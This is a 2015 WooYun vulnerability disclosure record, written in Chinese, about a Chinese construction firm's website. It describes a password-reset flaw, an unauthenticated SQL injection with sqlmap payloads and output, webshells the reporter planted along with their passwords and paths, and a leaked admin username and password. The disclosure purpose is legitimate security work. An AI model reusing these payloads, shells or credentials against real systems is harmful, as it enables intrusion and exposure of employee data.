{"id": 70442, "wybug_id": "wooyun-2015-0134503", "wybug_title": "中建技术中心漏洞全站沦陷", "wybug_corp": "中国建筑股份有限公司", "wybug_author": "Msyb", "wybug_date": "2015-08-19 21:59", "wybug_open_date": "2015-10-05 17:14", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-21：\tcncert国家互联网应急中心暂未能联系到相关单位，细节仅向通报机构公开\t\t\t\t\t\t\t\t\t2015-08-31：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-10：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-20：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-05：\t细节向公众公开  简要描述： 多处漏洞，泄露内部信息，员工资料。 详细说明：  首先是主站http://**.**.**.**/，用的是siteserver cms而且版本很老,漏洞一大堆，忘记密码那里有一个设计缺陷。\n\n禁用js输入用户名后直接点下一步，就可以直接看到密码。\n\n然后进后台，很简单就可以拿到shell。协同办公那里有一个注入，无需登录。http://**.**.**.**:806/vmain/login.jsp\n\n注入点:http://**.**.**.**:806/ServiceAction/com.velcro.base.GetDataAction?action=checkname&formid=参数:formid搞到管理员账号密码后进入，用户名sysadmin1,密码89498866\n\n这里可以拿shell\n\n地址:http://**.**.**.**:806//picstore/fbb204a4061ffbd41284a84c258c1bfb.jsp无密码\n\n管理员权限，就不进一步提权了。   漏洞证明：  http://**.**.**.**/css/qw.aspx 密码admin还有一个菜刀马，http://**.**.**.**/css/wy.aspx密码choppersqlmap的log\nsqlmap identified the following injection points with a total of 104 HTTP(s) requests:---Place: GETParameter: formid    Type: UNION query    Title: Generic UNION query (NULL) - 1 column    Payload: action=checkname&formid=' UNION ALL SELECT CHAR(58)+CHAR(122)+CHAR(117)+CHAR(115)+CHAR(58)+CHAR(65)+CHAR(77)+CHAR(107)+CHAR(65)+CHAR(106)+CHAR(68)+CHAR(109)+CHAR(116)+CHAR(109)+CHAR(110)+CHAR(58)+CHAR(114)+CHAR(108)+CHAR(121)+CHAR(58)--     Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: action=checkname&formid='; WAITFOR DELAY '0:0:5';--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: action=checkname&formid=' WAITFOR DELAY '0:0:5'-----available databases [17]:[*] biaozhun[*] BXLC[*] CKPTHNT[*] cscect[*] cscecttest[*] JCGL[*] master[*] model[*] MR2000DB[*] msdb[*] MyMap[*] ReportServer[*] ReportServerTempDB[*] SDJK[*] siteserver[*] tempdb[*] XXKZsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: formid    Type: UNION query    Title: Generic UNION query (NULL) - 1 column    Payload: action=checkname&formid=' UNION ALL SELECT CHAR(58)+CHAR(122)+CHAR(117)+CHAR(115)+CHAR(58)+CHAR(65)+CHAR(77)+CHAR(107)+CHAR(65)+CHAR(106)+CHAR(68)+CHAR(109)+CHAR(116)+CHAR(109)+CHAR(110)+CHAR(58)+CHAR(114)+CHAR(108)+CHAR(121)+CHAR(58)--     Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: action=checkname&formid='; WAITFOR DELAY '0:0:5';--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: action=checkname&formid=' WAITFOR DELAY '0:0:5'-----available databases [34]:[*] biaozhun[*] BXLC[*] CKPTHNT[*] cscect[*] cscecttest[*] JCGL[*] master[*] model[*] MR2000DB[*] msdb[*] MyMap[*] ReportServer[*] ReportServerTempDB[*] SDJK[*] siteserver[*] tempdb[*] XXKZ\n员工信息:\n\n\n\n内部信息:\n\n仅截图证明危害。   修复方案：  全部升级。   版权声明：转载请注明来源 Msyb@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2015-08-21 17:12 厂商回复： CNVD确认所述情况，已经由CNVD通过网站公开联系方式向网站管理单位通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}